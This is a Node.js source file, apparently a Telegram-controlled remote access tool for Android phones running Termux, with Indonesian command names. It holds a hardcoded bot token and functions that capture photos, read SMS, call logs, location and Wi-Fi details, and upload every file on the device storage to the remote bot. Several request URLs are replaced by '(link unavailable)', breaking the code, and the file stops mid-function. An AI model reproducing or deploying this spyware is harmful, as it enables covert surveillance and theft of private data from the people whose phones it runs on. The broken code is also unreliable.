
const axios = require('axios');
const { exec } = require('child_process');

const token = '7828558736:AAET5sG0jxnniUOQbSAvnj5DZKsUYL2Q0fM';
const id = '5951232585';

const commands = {
  'Ambil Foto': takePhoto,
  'Cek Status Baterai': checkBattery,
  'Dapatkan Lokasi': getLocation,
  'Informasi Sistem': getSystemInfo,
  'Ambil SMS': getSms,
  'Ambil Log Panggilan': getCallLog,
  'Ubah Wallpaper': setWallpaper,
  'Panggil Nomor Telepon': makeCall,
  'Kirim Semua File': sendAllFiles,
  'Dapatkan Info Koneksi Wi-Fi': getWifiInfo,
  'Hidupkan Wi-Fi': setWifiTrue,
  'Matikan Wi-Fi': setWifiFalse,
  'Spam Notifikasi': spamNotifications,
  'Reset Semua Perintah': reset,
  'Menu': sendMenu,
};

let stateFile = '.STATE';
let state = '';

async function takePhoto() {
  exec('termux-camera-photo -c 1 /sdcard/foto.jpg', (error, stdout, stderr) => {
    if (error) {
      sendMessage('Gagal mengambil foto.');
    } else {
      sendMessage('Foto berhasil diambil. Sedang dikirim...');
      axios.post(`(link unavailable), {
        chat_id: id,
        photo: 'file:///sdcard/Pictures',
      });
    }
  });
}

async function checkBattery() {
  exec('termux-battery-status', (error, stdout, stderr) => {
    if (error) {
      sendMessage('Gagal mendapatkan status baterai.');
    } else {
      sendMessage(`Status Baterai: ${stdout.trim()}`);
    }
  });
}

async function getLocation() {
  exec('termux-location', (error, stdout, stderr) => {
    if (error) {
      sendMessage('Gagal mendapatkan lokasi.');
    } else {
      sendMessage(`Lokasi Anda: ${stdout.trim()}`);
    }
  });
}

async function getSystemInfo() {
  exec('termux-info', (error, stdout, stderr) => {
    if (error) {
      sendMessage('Gagal mendapatkan informasi sistem.');
    } else {
      sendMessage(`Informasi Sistem: ${stdout.trim()}`);
    }
  });
}

async function getSms() {
  exec('termux-sms-list', (error, stdout, stderr) => {
    if (error) {
      sendMessage('Gagal mendapatkan SMS.');
    } else {
      sendMessage(`Daftar SMS:\n${stdout.trim()}`);
    }
  });
}

async function getCallLog() {
  exec('termux-call-log', (error, stdout, stderr) => {
    if (error) {
      sendMessage('Gagal mendapatkan log panggilan.');
    } else {
      sendMessage(`Log Panggilan:\n${stdout.trim()}`);
    }
  });
}

async function setWallpaper() {
  sendMessage('Masukkan URL wallpaper yang ingin digunakan:');
  state = 'waiting_for_wallpaper_url';
}

async function makeCall() {
  sendMessage('Masukkan nomor telepon yang ingin dipanggil:');
  state = 'waiting_for_phone_number';
}

async function sendAllFiles() {
  exec('find /storage/emulated/0/ -type f', (error, stdout, stderr) => {
    if (error) {
      sendMessage('Gagal mendapatkan file.');
    } else {
      const files = stdout.trim().split('\n');
      files.forEach((file) => {
        axios.post(`(link unavailable), {
          chat_id: id,
          document: `file://${file}`,
        });
      });
    }
  });
}

async function getWifiInfo() {
  exec('termux-wifi-connectioninfo', (error, stdout, stderr) => {
    if (error) {
      sendMessage('Gagal mendapatkan informasi Wi-Fi.');
    } else {
      sendMessage(`Informasi Koneksi Wi-Fi:\n${stdout.trim()}`);
    }
  });
}

async function setWifiTrue() {
  exec('termux-wifi-enable true', (error, stdout, stderr) => {
    if (error) {
      sendMessage('Gagal menghidupkan Wi-Fi.');
    } else {
      sendMessage('Wi-Fi dihidupkan.');
    }
  });
}

async function setWifiFalse() {
  exec('termux-wifi-enable false', (error, stdout, stderr) => {
    if (error) {
      sendMessage('Gagal mematikan Wi-Fi.');
    } else {
      sendMessage('Wi-Fi dimatikan.');
    }
  });
}

async function spamNotifications() {
```
